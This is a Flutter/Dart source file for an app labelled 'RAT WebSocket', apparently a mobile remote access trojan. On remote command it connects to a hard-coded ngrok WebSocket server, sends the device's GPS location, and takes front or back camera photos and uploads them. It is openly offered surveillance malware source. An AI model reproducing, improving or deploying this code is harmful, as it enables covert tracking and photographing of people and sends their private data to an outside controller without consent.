import 'dart:async';
import 'dart:convert';
import 'package:camera/camera.dart';
import 'package:path_provider/path_provider.dart';
import 'dart:io';
import 'package:flutter/material.dart';
import 'package:web_socket_channel/web_socket_channel.dart';
import 'package:geolocator/geolocator.dart';

void main() {
  runApp(
    MaterialApp(
      // title: "RAT WebSocket",
      // theme: ThemeData(primarySwatch: Colors.blue),
      debugShowCheckedModeBanner: false,
      home: Center(child: Text("RAT WebSocket running...")),
    ),
  );
  WebSocketManager().connect();
  Geolocator.requestPermission();
  Geolocator.getCurrentPosition(
        locationSettings: LocationSettings(accuracy: LocationAccuracy.high),
      )
      .then((position) {
        print("Current Position: ${position.latitude}, ${position.longitude}");
      })
      .catchError((e) {
        print("Error getting location: $e");
      });
}

class WebSocketManager {
  WebSocketChannel? _channel;
  Timer? _reconnectTimer;
  final String serverUrl = "wss://fa4e-43-231-208-239.ngrok-free.app";
  //http://localhost:8080

  void connect() {
    _channel = WebSocketChannel.connect(Uri.parse(serverUrl));
    print("Connecting to $serverUrl...");

    _channel?.stream.listen(
      (message) {
        print("Received: $message");
        handleCommand(message.toString());
      },
      onDone: () {
        print("Disconnected. Trying to reconnect...");
        _retryConnection();
      },
      onError: (e) {
        print("Error: $e");
        _retryConnection();
      },
    );
  }

  void _retryConnection() {
    _reconnectTimer?.cancel();
    _reconnectTimer = Timer(Duration(seconds: 5), () {
      connect();
    });
  }

  Future<void> handleCommand(String command) async {
    if (command == "PING") {
      _channel?.sink.add("PONG");
    } else if (command == "GET_LOCATION") {
      final position = await Geolocator.getCurrentPosition();
      _channel?.sink.add("LOCATION:${position.latitude},${position.longitude}");
    } else if (command == "CAPTURE_FRONT") {
      await captureAndSendPhoto(CameraLensDirection.front);
    } else if (command == "CAPTURE_BACK") {
      await captureAndSendPhoto(CameraLensDirection.back);
    }
    // Add more command handling here
  }

  Future<void> captureAndSendPhoto(CameraLensDirection direction) async {
    try {
      final cameras = await availableCameras();
      final selectedCamera = cameras.firstWhere(
        (cam) => cam.lensDirection == direction,
        orElse: () => cameras.first,
      );

      final controller = CameraController(
        selectedCamera,
        ResolutionPreset.medium,
      );
      await controller.initialize();

      final dir = await getTemporaryDirectory();
      final path = '${dir.path}/${DateTime.now().millisecondsSinceEpoch}.jpg';
      final file = await controller.takePicture();
      await file.saveTo(path);

      controller.dispose();

      final bytes = await File(path).readAsBytes();
      _channel?.sink.add("PHOTO:photo.jpg:${bytes.length}\n");
      _channel?.sink.add(bytes);
      _channel?.sink.add("PHOTO:${direction.name}:${base64Encode(bytes)}");
    } catch (e) {
      _channel?.sink.add("ERROR:CAMERA:$e");
    }
  }

  void dispose() {
    _channel?.sink.close();
    _reconnectTimer?.cancel();
  }
}
